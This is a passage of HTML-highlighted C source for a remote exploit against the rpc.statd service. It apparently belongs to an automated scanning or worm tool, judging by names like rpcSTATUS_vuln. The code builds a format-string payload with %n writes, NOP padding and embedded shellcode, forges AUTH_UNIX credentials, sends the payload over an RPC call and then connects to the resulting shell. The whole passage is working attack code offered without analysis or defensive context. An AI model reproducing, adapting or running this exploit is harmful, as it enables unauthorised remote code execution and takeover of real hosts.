    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">pbyte</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x00</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">pbyte</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x24</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/*
** Unless the user gives us a psychotic value,
** the address should now be clean.
*/</span><span class="sc0">

    </span><span class="sc1">/* str */</span><span class="sc0">
    </span><span class="sc11">cnt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">24</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc1">/* 1 = process nul */</span><span class="sc0">
    </span><span class="sc11">buflen</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc11">cnt</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(!(</span><span class="sc11">buff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">buflen</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">perror</span><span class="sc10">(</span><span class="sc6">"malloc()"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc11">EXIT_FAILURE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc19">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">NOP</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buflen</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++,</span><span class="sc0"> </span><span class="sc11">retpos</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* junk dword */</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">*</span><span class="sc19">ptr</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">retpos</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc1">/* r + i */</span><span class="sc0">
        </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc19">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">cnt</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* restore */</span><span class="sc0">
    </span><span class="sc11">retpos</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">wipe</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* consistent calculations */</span><span class="sc0">
        </span><span class="sc11">strncpy</span><span class="sc10">(</span><span class="sc19">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%8x"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">cnt</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">dstpos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">bufpos</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc19">offset</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/*
** This small algorithm of mine can be used
** to obtain "difficult" values..
*/</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">pad</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dstpos</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">pad</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">cnt</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc19">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%%n%%n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc1">/* 0xffffffff = display count of 8 */</span><span class="sc0">
            </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">pad</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">cnt</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">pad</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">cnt</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">pad</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">pad</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc11">cnt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cnt</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">pad</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc1">/* the source of this evil */</span><span class="sc0">
            </span><span class="sc11">tmp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc19">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%%%dx%%n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pad</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc10">*</span><span class="sc19">ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">NOP</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc1">/* plug in the shellcode */</span><span class="sc0">
    </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">buflen</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">sc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc11">buflen</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc9">#ifdef DEBUG
</span><span class="sc0">    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"buffer: %#lx length: %d (+str/+nul)\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bufpos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"target: %#lx new: %#lx (offset: %d)\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">retpos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dstpos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc19">offset</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"wiping %d dwords\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">wipe</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">in_addr</span><span class="sc0">
</span><span class="sc11">STATUS_getip</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hostent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hs</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">hs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">gethostbyname</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">herror</span><span class="sc10">(</span><span class="sc6">"gethostbyname()"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc11">EXIT_FAILURE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">*((</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">in_addr</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">hs</span><span class="sc10">-&gt;</span><span class="sc11">h_addr</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> 
</span><span class="sc11">Handle_Port_STATUS</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hostip</span><span class="sc10">,</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">iptr</span><span class="sc10">)</span><span class="sc0">  </span><span class="sc2">//Handle rpc.statd, return 1 if success
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buff</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">CLIENT</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">clnt</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">enum</span><span class="sc0"> </span><span class="sc11">clnt_stat</span><span class="sc0"> </span><span class="sc11">res</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">timeval</span><span class="sc0"> </span><span class="sc11">tv</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tvr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sm_name</span><span class="sc0"> </span><span class="sc11">smname</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sm_stat_res</span><span class="sc0"> </span><span class="sc11">smres</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc19">type</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">usetcp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">timeout</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">wipe</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc19">offset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">600</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">buflen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1024</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Status_shellcode</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">u_short</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">u_long</span><span class="sc0"> </span><span class="sc11">bufpos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sockp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">RPC_ANYSOCK</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc19">type</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc19">type</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc19">type</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc11">types</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc11">types</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc11">sc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">types</span><span class="sc10">[</span><span class="sc19">type</span><span class="sc10">].</span><span class="sc11">code</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">bufpos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">types</span><span class="sc10">[</span><span class="sc19">type</span><span class="sc10">].</span><span class="sc11">bufpos</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">buflen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">types</span><span class="sc10">[</span><span class="sc19">type</span><span class="sc10">].</span><span class="sc11">buflen</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc19">offset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">types</span><span class="sc10">[</span><span class="sc19">type</span><span class="sc10">].</span><span class="sc19">offset</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">wipe</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">types</span><span class="sc10">[</span><span class="sc19">type</span><span class="sc10">].</span><span class="sc11">wipe</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">bufpos</span><span class="sc10">)</span><span class="sc0">  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">bzero</span><span class="sc10">(&amp;</span><span class="sc11">addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">port</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">STATUS_getip</span><span class="sc10">(</span><span class="sc11">hostip</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">tv</span><span class="sc10">.</span><span class="sc11">tv_sec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">timeout</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">tv</span><span class="sc10">.</span><span class="sc11">tv_usec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc11">clnt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">clnttcp_create</span><span class="sc10">(&amp;</span><span class="sc11">addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SM_PROG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SM_VERS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sockp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">clnt</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* AUTH_UNIX / AUTH_SYS authentication forgery */</span><span class="sc0">
    </span><span class="sc11">clnt</span><span class="sc10">-&gt;</span><span class="sc11">cl_auth</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">authunix_create</span><span class="sc10">(</span><span class="sc6">"localhost"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">buff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">STATUS_wizardry</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bufpos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buflen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc19">offset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">wipe</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">==</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">smname</span><span class="sc10">.</span><span class="sc11">mon_name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">res</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">clnt_call</span><span class="sc10">(</span><span class="sc11">clnt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SM_STAT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xdrproc_t</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">xdr_sm_name</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc10">(</span><span class="sc11">caddr_t</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">smname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xdrproc_t</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">xdr_sm_stat_res</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc10">(</span><span class="sc11">caddr_t</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">smres</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tv</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">clnt_destroy</span><span class="sc10">(</span><span class="sc11">clnt</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">res</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">RPC_SUCCESS</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#ifdef DEBUG
</span><span class="sc0">        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"A timeout was expected. Attempting connection to shell..\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif        
</span><span class="sc0">    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">//        sleep(5); STATUS_connection(addr);
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">rpcSTATUS_vuln</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">hostip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">iptr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">//if Handle_Port_STATUS =1 the do 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">sleep</span><span class="sc10">(</span><span class="sc4">5</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">STATUS_connection</span><span class="sc10">(</span><span class="sc11">hostip</span><span class="sc10">,</span><span class="sc11">iptr</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span></div></body>
</html>
